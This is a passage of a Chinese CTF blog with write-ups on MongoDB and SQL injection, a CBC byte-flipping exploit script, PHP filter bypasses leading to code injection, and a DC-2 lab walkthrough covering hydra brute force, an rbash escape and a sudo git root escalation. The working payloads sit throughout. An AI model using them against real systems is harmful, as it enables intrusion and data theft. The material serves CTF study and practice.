<p>看起来这里是分别根据类型和是否公开两个标准来呈现新闻条目的统计情况的.而且开局界面的那些新闻都筛选出来的公开的新闻,根据源码也可以看出filter是注入点(毕竟不会无缘无故给你一个功能的嘛).</p>
<p>然后不会mongodb…赛后看payload如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/index.php?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12</span><br></pre></td></tr></table></figure>
<p>分析一下</p>
<p>这里的结构解析出来到代码中就类似于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;project&quot;]=&gt; array(1) &#123; </span><br><span class="line">    [&quot;category&quot;]=&gt; array(1) &#123;</span><br><span class="line">	[&quot;$cond&quot;]=&gt; array(3) &#123;</span><br><span class="line">	    [&quot;if&quot;]=&gt; array(1) &#123;</span><br><span class="line">		[&quot;$eq&quot;]=&gt; array(2) &#123;</span><br><span class="line">		    [0]=&gt; array(1) &#123; [&quot;$strLenBytes&quot;]=&gt; string(6) &quot;$title&quot; &#125; </span><br><span class="line">		    [1]=&gt; array(1) &#123; [&quot;$toInt&quot;]=&gt; string(2) &quot;19&quot; &#125; </span><br><span class="line">		&#125; </span><br><span class="line">	    &#125; </span><br><span class="line">	    [&quot;then&quot;]=&gt; string(5) &quot;$text&quot; </span><br><span class="line">	    [&quot;else&quot;]=&gt; string(2) &quot;12&quot; </span><br><span class="line">	&#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合代码来看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pipeline = [</span><br><span class="line">    [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]],</span><br><span class="line">    [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],</span><br><span class="line">    [&apos;$limit&apos; =&gt; 5],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$filters = [</span><br><span class="line">    [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]]</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>我们经过$cond筛选后得到的category会被当做_id并在下文中呈现出来.$eq $cond $strLenBytes $toInt 这些都是mongodb中的全局变量或者是数据库中的字段名,全局变量起到的是函数的作用,这段payload的意思就是首先对$title进行统计长度($strLenBytes),然后对数字19(是flag所在条目的title长度,可以一个一个数字去爆破)进行取整($toInt),最后比较他们两者是否相等($eq),如果相等,就将这个条目的$text内容赋值给category,否则,就赋值12.</p>
<p>这里有一点需要注意,mongodb中每个expression都必须被一对花括号括起来(json格式),这也解释了为什么payload中有一个空的中括号了<code>[]</code></p>
<p>参考链接:</p>
<p><a href="https://impakho.com/post/cybrics-ctf-2019-writeup?from=timeline" target="_blank" rel="noopener">https://impakho.com/post/cybrics-ctf-2019-writeup?from=timeline</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/cond/index.html" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/cond/index.html</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/eq/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/eq/</a></p>
<h2 id="ichunqiu-百度杯Vld">ichunqiu 百度杯Vld</h2>
<p>关键代码<code>login.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'dbmysql.class.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">    $db = <span class="keyword">new</span> mysql_db();</span><br><span class="line">    <span class="comment">//所谓safedata其实就是addslash</span></span><br><span class="line">    $username = $db-&gt;safe_data($_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $password = $db-&gt;my_md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $number = is_numeric($_POST[<span class="string">'number'</span>]) ? $_POST[<span class="string">'number'</span>] : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意这个诡异的替换，如果我们传入%00和一个单引号，在addslash之后会有\0\'，然后经过这个函数的替换之后成为\\'，可以实现逃逸。</span></span><br><span class="line">    $username = trim(str_replace($number, <span class="string">''</span>, $username));</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from"</span>.<span class="string">"`"</span>.table_name.<span class="string">"`"</span>.<span class="string">"where username="</span>.<span class="string">"'"</span>.<span class="string">"$username"</span>.<span class="string">"'"</span>;</span><br><span class="line">    $row = $db-&gt;query($sql);</span><br><span class="line">    $result = $db-&gt;fetch_array($row);</span><br><span class="line">    <span class="keyword">if</span>($row)&#123;</span><br><span class="line">        <span class="keyword">if</span>($result[<span class="string">"number"</span>] === $number &amp;&amp; $result[<span class="string">"password"</span>] === $password)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('nothing here!')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">            alert('密码错误，老司机翻车了!');</span></span><br><span class="line"><span class="string">            function jumpurl()&#123;</span></span><br><span class="line"><span class="string">                location='login.html';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            setTimeout('jumpurl()',1000);</span></span><br><span class="line"><span class="string">            &lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(mysql_error());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">            alert('用户名密码不能为空!');</span></span><br><span class="line"><span class="string">            function jumpurl()&#123;</span></span><br><span class="line"><span class="string">                location='login.html';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            setTimeout('jumpurl()',1000);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),database())x from information_schema.tables group by x )a) ;%23&amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select table_name from information_schema.tables where table_schema=database() limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select column_name from information_schema.columns where table_schema=database() limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select flag from ctf.flag limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps:group_concat 可能遇到未知问题</p>
</blockquote>
<p>updatexml:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and updatexml(1,(select mid(concat(1,group_concat(flag)),1,64) from ctf.flag),1)%23&amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<p>报错位数有限，偏移一下就可以了。</p>
<p>注意：group_concat 之前不加东西可能读不全，如下</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57983217-e271f600-7a81-11e9-9dd5-d087a09c7716.png" alt="image"></p>
<h2 id="多次">多次</h2>
<p>通过异或符号来检测有哪些符号被过滤了.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;</span><br><span class="line">1&quot;</span><br><span class="line">1&apos;--+</span><br><span class="line">1&quot;--+</span><br><span class="line">1&apos;^(0)--+</span><br><span class="line">1&apos;^(1)--+</span><br><span class="line">1&apos;^(length(&apos;select&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;union&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;or&apos;)&gt;0)--+</span><br><span class="line">.........</span><br><span class="line">-1&apos; uniunionon selselectect 1,2 --+</span><br><span class="line">-1&apos; uniunionon selselectect 1,database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag1&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;hint&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(flag1,&quot; :: &quot;,address) from flag1--+</span><br></pre></td></tr></table></figure>
<p>and we get the second address</p>
<h2 id="ichunqiu-SQL">ichunqiu SQL</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.ichunqiu.com/battalion?q=2619</span><br><span class="line">https://www.ichunqiu.com/writeup/detail/1845</span><br></pre></td></tr></table></figure>
<p>关于为什么不需要闭合的原因，因为是id，id是int类型的，默认情况下就是where id=(数字)，因此不需要闭合，除非有额外处理，都是要试出来的</p>
<blockquote>
<p>小插入：在mysql5.7 以上版本中，select from users limit 1 union select from (select 1)a join (select 2)b join (select 3)c;已经不能使用了；<br>
取而代之的是：(select from users limit 1) union (select from (select 1)a join (select 2)b join (select 3)c);</p>
</blockquote>
<h2 id="shiyan-club-login-background">shiyan-club login background</h2>
<p>we can detect that many keywords are filtered,like ‘union’, ‘=’(so use ‘regexp’),’substr’,’mid’,and so on.</p>
<p>based on exp-error</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema regexp database())a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(colunm_name) from informaion_schema.columns where table_name regexp &apos;ffll44jj&apos;)a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(value) from ff1144jj)a))) or &apos;</span><br></pre></td></tr></table></figure>
<p>based on xml-error</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlupdate and extractvalue</span><br><span class="line"></span><br><span class="line">username=1&apos; or/*&amp;password=&apos;*/extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*this require did not work</span><br><span class="line"></span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*but the responce is &quot;SELECT command denied to user &apos;web8&apos;@&apos;localhost&apos; for table &apos;tables&apos;&quot;</span><br><span class="line">/*syntax error*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*works but strangly , the first table_name do not show*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())))or&apos;</span><br><span class="line">/*works and show all the table_name*/</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1)or&apos;</span><br><span class="line">/*works ,same problem happend when delete &apos;0x7e&apos;*/</span><br></pre></td></tr></table></figure>
<h2 id="shiyanbar-登陆一下好吗？">shiyanbar 登陆一下好吗？</h2>
<p>payload1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:&apos;=&apos;</span><br><span class="line">password:&apos;=&apos;</span><br><span class="line">语句为：select flag from xxx where username=&apos;&apos;=&apos;&apos; and password=&apos;&apos;=&apos;&apos;;</span><br></pre></td></tr></table></figure>
<p>payload2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:b&apos;+0;%00</span><br><span class="line">username 在burpsuite中改，%00在burpsuite中是%2500,变成%00,其他不变就可以了</span><br><span class="line">password:1</span><br><span class="line"># 语句为：select flag from xxx where username=&apos;a&apos;+0;%00&apos;and password=&apos;1&apos;;</span><br></pre></td></tr></table></figure>
<h2 id="cbc-字节翻转攻击注入">cbc 字节翻转攻击注入</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def denglu(payload,idx,c1,c2):</span><br><span class="line">    url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">    payload = &#123;&apos;id&apos;: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    iv=re.findall(r&quot;iv=(.*?),&quot;, Set_Cookie)[0]</span><br><span class="line">    cipher=re.findall(r&quot;cipher=(.*)&quot;, Set_Cookie)[0]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=&apos;&apos;.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;&apos;iv&apos;: iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;, cont)[0]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">    iv_new=&apos;&apos;</span><br><span class="line">    for i in range(16):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;&apos;iv&apos;: iv_new, &apos;cipher&apos;: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    print rcont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">denglu(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>php常见绕过</title>
    <url>/2020/01/20/php-bypass/</url>
    <content><![CDATA[<h2 id="一道校赛题">一道校赛题</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (    preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第一层绕过: url编码来绕过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"><span class="comment">// 第二层绕过: aqua_is_cute%0a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 第三层绕过: 给所有get传参数的变量同时post一个同名的变量, 变量的值是数字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"><span class="comment">// 第四层绕过: data://text/plain,debu_debu_aqua</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第五层绕过: shana和passwd 都赋值成数组</span></span><br><span class="line"><span class="comment">// flag[code]=xxxxx</span></span><br><span class="line"><span class="comment">// flag[arg]=xxxx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第六层绕过: </span></span><br><span class="line"><span class="comment">// code=%5ccreate_function </span></span><br><span class="line"><span class="comment">// arg=return;&#125;require(get_defined_vars()[_GET][rce]);//</span></span><br><span class="line"><span class="comment">// rce=php://filter/read=convert.base64-encode/resource=rea1fl4g.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20200120225243803.png" alt="image-20200120225243803"></p>
]]></content>
  </entry>
  <entry>
    <title>Vulhub-DC-2</title>
    <url>/2019/05/23/Vulhub-DC-2/</url>
    <content><![CDATA[<h2 id="DC-2-靶机渗透">DC-2 靶机渗透</h2>
<p>复现不下去了来打打靶机，嘤嘤嘤~~~</p>
<p>首先<code>arp-scan -l</code> 和<code>nmap -A -p- 172.28.15.94</code> 开路，参数A <code>Enable OS detection, version detection, script scanning, and traceroute</code> 。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58260318-d00cfa80-7da8-11e9-8af5-c5fc585b160e.png" alt="image"></p>
<p>然后访问<code>http://dc-2</code> 访问不了，于是在<code>/etc/hosts</code> 中添加<code> dc-2	172.28.15.94</code> ，然后就可以访问了。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58260265-bb306700-7da8-11e9-8270-83388ac493a0.png" alt="image"></p>
<p>看到了第一个<code>flag</code> ，提示说让使用工具<code>cewl</code> 这是一个通过爬取网页内容来生成password的工具。</p>
<p><code>cewl -w dc2_passwords.txt http://dc-2</code></p>
<p>经过<code>wpscan</code> 扫描之后可以看到三个用户名<code>jerry</code> <code>admin</code> <code>tom</code> ，尝试使用<code>hydra</code> 来爆破。</p>
<p><code>hydra -L dc-2_user.txt -P dc2_password.txt dc-2 http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'</code></p>
<p>字符串里的东西以<code>:</code>为分隔符分成几个<code>hydra</code> 的参数，被<code>^</code> 包裹的是传参位置标志，S表示希望成功。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58261191-6ee62680-7daa-11e9-8751-388384b1be62.png" alt="image"></p>
<p>发现了两个用户名的密码，然后在<code>/wp-login.php</code>下登录<code>jerry</code> 可以看到第二个flag。</p>
<p>尝试<code>ssh jerry@dc-2 -p</code> 失败，但是可以用<code>tom</code> 进行登录，进去之后使用<code>cd</code> 和<code>ls</code> 就会弹出<code>rbash</code> 的提示。但是可以使用<code>vi</code>命令，进入<code>vim</code> 之后以他为媒介执行命令<code>set shell=/bin/sh</code>以及<code>shell</code> ，就可以来到<code>sh</code> 环境下，配置环境变量<code>export PATH=/usr/sbin/:/usr/bin:/sbin:/bin</code> 之后就可以正常执行命令了，可以获得<code>flag3</code> 了。</p>
<p>最后就是提权了。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58263410-81625f00-7dae-11e9-9664-e58db889bbe1.png" alt="image"></p>
<p>根据提示 <code>sudo -l</code>列出可以执行的<code>sudo </code>命令，但是失败了。。。尝试登陆<code>jerry</code> 账号成功并且拿到了<code>flag4.txt</code> 根据文件中最后的提示，执行一下<code>sudo -l</code> ，发现可以执行<code>git</code>命令，使用<code>sudo git help status</code> ，并在里面执行<code>!/bin/bash</code> ，这样就可以以<code>root</code>的权限来到bash了，提权成功。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58263823-56c4d600-7daf-11e9-9b25-bb2b26e63a8a.png" alt="image"></p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>备忘录-sql</title>
    <url>/2020/01/09/%E5%A4%87%E5%BF%98%E5%BD%95-sql/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="024d00844bb61cf23a5464f9e727018d899456ffca0a002883c1486983b0e7b9"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>计算器和php语言动态特性</title>
    <url>/2020/01/14/php-calculator-and-dynamic-character/</url>
    <content><![CDATA[<h2 id="Roar-CTF-easy-calc">Roar CTF easy calc</h2>
<p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexdec(bin2hex(&apos;/&apos;));</span><br><span class="line">?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号</span><br><span class="line">hexdec(bin2hex(&apos;/f1agg&apos;));</span><br><span class="line">?+num=file_get_contents(hex2bin(dechex(52115961636711)))</span><br></pre></td></tr></table></figure>
<p>源码是这么执行语句的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">       $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">       <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">               <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019-love-math">CISCN 2019 love math</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, 